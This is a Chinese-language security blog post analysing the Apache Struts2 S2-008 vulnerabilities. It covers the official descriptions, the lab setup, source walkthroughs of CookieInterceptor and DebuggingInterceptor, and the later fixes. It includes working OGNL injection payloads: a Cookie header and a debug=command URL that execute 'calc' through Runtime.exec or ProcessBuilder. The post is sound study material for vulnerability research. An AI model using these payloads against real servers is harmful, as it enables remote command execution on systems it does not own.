<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="摸鱼">
  <meta name="author" content="Aluvion">
  <meta name="keywords" content="">
  <title>struts2系列漏洞 S2-008 - Twings</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />

<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">



  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />

<link  rel="stylesheet" href="/css/main.css" />


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />


<!-- 自定义样式保持在最底部 -->


<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期日, 七月 19日 2020, 8:20 晚上
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    1.6k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      8 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p>
<p>S2-008 实际上是多个漏洞的合集。</p>
<span id="more"></span>

<hr>
<h3 id="S2-008-01"><a href="#S2-008-01" class="headerlink" title="S2-008-01"></a>S2-008-01</h3><h4 id="官方描述"><a href="#官方描述" class="headerlink" title="官方描述"></a>官方描述</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Remote command execution in Struts &lt;= 2.2.3 (ExceptionDelegator)</span><br><span class="line">When an exception occurs while applying parameter values to properties, the value is evaluated as an OGNL expression. For example, this occurs when setting a string value to an integer property. Since the values are not filtered an attacker can abuse the power of the OGNL language to execute arbitrary Java code leading to remote command execution. This issue has been reported (https://issues.apache.org/jira/browse/WW-3668) and was fixed in Struts 2.2.3.1. However the ability to execute arbitrary Java code has been overlooked.</span><br></pre></td></tr></table></figure>

<p>其实就是 S2-007。</p>
<h3 id="S2-008-02"><a href="#S2-008-02" class="headerlink" title="S2-008-02"></a>S2-008-02</h3><h4 id="官方描述-1"><a href="#官方描述-1" class="headerlink" title="官方描述"></a>官方描述</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Remote command execution in Struts &lt;= 2.3.1 (CookieInterceptor)</span><br><span class="line">The character whitelist for parameter names is not applied to the CookieInterceptor. When Struts is configured to handle cookie names, an attacker can execute arbitrary system commands with static method access to Java functions. Therefore the flag allowStaticMethodAccess can be set to true within the request.</span><br></pre></td></tr></table></figure>

<p>看描述跟 S2-003&#x2F;S2-005 的触发机制类似（指触发点都在变量名），不过触发点不在 ParametersInterceptor 而在没有加上 CookieInterceptor。</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>2.2.3.1 版本 struts2 + tomcat6，再给 action 加上 cookie 配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;interceptor-ref name=<span class="string">&quot;cookie&quot;</span>&gt;</span><br><span class="line">    &lt;param name=<span class="string">&quot;cookiesName&quot;</span>&gt;*&lt;/param&gt;</span><br><span class="line">    &lt;param name=<span class="string">&quot;cookiesValue&quot;</span>&gt;*&lt;/param&gt;</span><br><span class="line">&lt;/interceptor-ref&gt;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>首先是 CookieInterceptor 类的 intercept 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// contains selected cookies</span></span><br><span class="line">    <span class="keyword">final</span> Map&lt;String, String&gt; cookiesMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">    Cookie[] cookies = ServletActionContext.getRequest().getCookies();</span><br><span class="line">    <span class="keyword">if</span> (cookies != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ValueStack</span> <span class="variable">stack</span> <span class="operator">=</span> ActionContext.getContext().getValueStack();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Cookie cookie : cookies) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cookie.getName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cookiesNameSet.contains(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">                ...</span><br><span class="line">            	populateCookieValueIntoStack(name, value, cookiesMap, stack);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cookiesNameSet.contains(cookie.getName())) &#123;</span><br><span class="line">            	populateCookieValueIntoStack(name, value, cookiesMap, stack);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject the cookiesMap, even if we don&#x27;t have any cookies</span></span><br><span class="line">    injectIntoCookiesAwareAction(invocation.getAction(), cookiesMap);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查文件中配置的 cookie name 之后调用 populateCookieValueIntoStack：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">populateCookieValueIntoStack</span><span class="params">(String cookieName, String cookieValue, Map&lt;String, String&gt; cookiesMap, ValueStack stack)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cookiesValueSet.isEmpty() || cookiesValueSet.contains(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// If the interceptor is configured to accept any cookie value</span></span><br><span class="line">        <span class="comment">// OR</span></span><br><span class="line">        <span class="comment">// no cookiesValue is defined, so as long as the cookie name match</span></span><br><span class="line">        <span class="comment">// we&#x27;ll inject it into Struts&#x27; action</span></span><br><span class="line">        ...</span><br><span class="line">        cookiesMap.put(cookieName, cookieValue);</span><br><span class="line">        stack.setValue(cookieName, cookieValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// if cookiesValues is specified, the cookie&#x27;s value must match before we</span></span><br><span class="line">        <span class="comment">// inject them into Struts&#x27; action</span></span><br><span class="line">        <span class="keyword">if</span> (cookiesValueSet.contains(cookieValue)) &#123;</span><br><span class="line">            ...</span><br><span class="line">            cookiesMap.put(cookieName, cookieValue);</span><br><span class="line">            stack.setValue(cookieName, cookieValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用 stack.setValue 之后：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(String expr, Object value)</span> &#123;</span><br><span class="line">	setValue(expr, value, devMode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(String expr, Object value, <span class="type">boolean</span> throwExceptionOnFailure)</span> &#123;</span><br><span class="line">    Map&lt;String, Object&gt; context = getContext();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        trySetValue(expr, value, throwExceptionOnFailure, context);</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">trySetValue</span><span class="params">(String expr, Object value, <span class="type">boolean</span> throwExceptionOnFailure, Map&lt;String, Object&gt; context)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">    ...</span><br><span class="line">    ognlUtil.setValue(expr, context, root, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(String name, Map&lt;String, Object&gt; context, Object root, Object value)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">    Ognl.setValue(compile(name), context, root, value);</span><br><span class="line">&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>将 cookieName 作为一个表达式进行了求值，触发了漏洞。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>Tomcat 对 cookie name 有很多限制，所以这个漏洞相对十分鸡肋，需要低版本的 Tomcat，payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: (&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;)(1)(2)=Aluvion; (&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;)(1)(2)=Twings; </span><br></pre></td></tr></table></figure>

<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>2.3.3 版本的修复，给 CookieInterceptor 也加上了类似 ParametersInterceptor 的正则表达式限制：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ACCEPTED_PATTERN</span> <span class="operator">=</span> <span class="string">&quot;[a-zA-Z0-9\\.\\]\\[_&#x27;\\s]+&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">Pattern</span> <span class="variable">acceptedPattern</span> <span class="operator">=</span> Pattern.compile(ACCEPTED_PATTERN);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (acceptedPattern.matcher(name).matches()) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="S2-008-03"><a href="#S2-008-03" class="headerlink" title="S2-008-03"></a>S2-008-03</h3><h4 id="官方描述-2"><a href="#官方描述-2" class="headerlink" title="官方描述"></a>官方描述</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Arbitrary File Overwrite in Struts &lt;= 2.3.1 (ParameterInterceptor)</span><br><span class="line">While accessing the flag allowStaticMethodAccess within parameters is prohibited since Struts 2.2.3.1 an attacker can still access public constructors with only one parameter of type String to create new Java objects and access their setters with only one parameter of type String. This can be abused in example to create and overwrite arbitrary files. To inject forbidden characters into a filename an uninitialized string property can be used.</span><br></pre></td></tr></table></figure>

<p>听说是 S2-009 的前身，那就之后再研究。</p>
<h3 id="S2-008-04"><a href="#S2-008-04" class="headerlink" title="S2-008-04"></a>S2-008-04</h3><h4 id="官方描述-3"><a href="#官方描述-3" class="headerlink" title="官方描述"></a>官方描述</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Remote command execution in Struts &lt;= 2.3.17 (DebuggingInterceptor)</span><br><span class="line">While not being a security vulnerability itself, please note that applications running in developer mode and using the DebuggingInterceptor are prone to remote command execution as well. While applications should never run in developer mode during production, developers should be aware that doing so not only has performance issues (as documented) but also a critical security impact.</span><br></pre></td></tr></table></figure>

<p>简单来说就是开启了调试模式，但是调试模式中存在 OGNL 表达式注入漏洞，也挺鸡肋的。</p>
<h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>2.3.14.2 版本的 struts2 + Tomcat 9，然后在 struts.xml 中加上一句：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.devMode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>2.3.14.1 版本之后设置了 allowStaticMethodAccess 不可修改：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> allowStaticMethodAccess;</span><br></pre></td></tr></table></figure>

<p>不过可以采用反射：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/login.action?debug=command&amp;expression=%23f=%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>

<p>或者用 java.lang.ProcessBuilder：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>按照官方描述，找到 DebuggingInterceptor 类，先注意到几个字符串变量：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">XML_MODE</span> <span class="operator">=</span> <span class="string">&quot;xml&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">CONSOLE_MODE</span> <span class="operator">=</span> <span class="string">&quot;console&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">COMMAND_MODE</span> <span class="operator">=</span> <span class="string">&quot;command&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">BROWSER_MODE</span> <span class="operator">=</span> <span class="string">&quot;browser&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SESSION_KEY</span> <span class="operator">=</span> <span class="string">&quot;org.apache.struts2.interceptor.debugging.VALUE_STACK&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">DEBUG_PARAM</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">OBJECT_PARAM</span> <span class="operator">=</span> <span class="string">&quot;object&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">EXPRESSION_PARAM</span> <span class="operator">=</span> <span class="string">&quot;expression&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">DECORATE_PARAM</span> <span class="operator">=</span> <span class="string">&quot;decorate&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>然后观察 intercept 方法，在开启了 devMode 的情况下，会从 GET 传参中获取 debug 参数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> getParameter(DEBUG_PARAM);</span><br></pre></td></tr></table></figure>

<p>然后进行判断，如果是 command：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (COMMAND_MODE.equals(type)) &#123;</span><br><span class="line">    <span class="type">ValueStack</span> <span class="variable">stack</span> <span class="operator">=</span> (ValueStack) ctx.getSession().get(SESSION_KEY);</span><br><span class="line">    <span class="keyword">if</span> (stack == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//allows it to be embedded on another page</span></span><br><span class="line">        stack = (ValueStack) ctx.get(ActionContext.VALUE_STACK);</span><br><span class="line">        ctx.getSession().put(SESSION_KEY, stack);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> getParameter(EXPRESSION_PARAM);</span><br><span class="line"></span><br><span class="line">    ServletActionContext.getRequest().setAttribute(<span class="string">&quot;decorator&quot;</span>, <span class="string">&quot;none&quot;</span>);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> ServletActionContext.getResponse();</span><br><span class="line">    res.setContentType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span></span><br><span class="line">        ServletActionContext.getResponse().getWriter();</span><br><span class="line">        writer.print(stack.findValue(cmd));</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">    	ex.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    cont = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从 GET 传参中获取 expression 参数，然后作为表达式进行了解析。</p>
<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>2.3.20 版本的修复，SecurityMemberAccess 中有一个 isAccessible 方法，里面有一个方法 isClassExcluded，在调用方法时会检测调用方法的类和定义方法的类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isClassExcluded(target.getClass(), member.getDeclaringClass())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">        LOG.warn(<span class="string">&quot;Target class [#0] or declaring class of member type [#1] are excluded!&quot;</span>, target, member);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isClassExcluded</span><span class="params">(Class&lt;?&gt; targetClass, Class&lt;?&gt; declaringClass)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (targetClass == Object.class || declaringClass == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; excludedClass : excludedClasses) &#123;</span><br><span class="line">        <span class="keyword">if</span> (targetClass.isAssignableFrom(excludedClass) || declaringClass.isAssignableFrom(excludedClass)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限制了定义方法的类不能是 Object，所以反射的 getClass 就不能用了，之后则是一个黑名单过滤，具体是什么可以调试看看，里面包括了 Runtime、Object、Class 等类和接口，所以 new 一个实例的时候也会触发黑名单。</p>
<hr>
<p>参考文章：</p>
<p><a href="https://www.freebuf.com/articles/web/25337.html">https://www.freebuf.com/articles/web/25337.html</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
                    
                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
                    
                      <a class="hover-with-bg" href="/tags/Struts2/">Struts2</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2020/07/20/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-009/">
                        <i class="fa fa-chevron-left"></i>
                        <span>struts2系列漏洞 S2-009</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2020/07/18/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-007/">
                        <span>struts2系列漏洞 S2-007</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
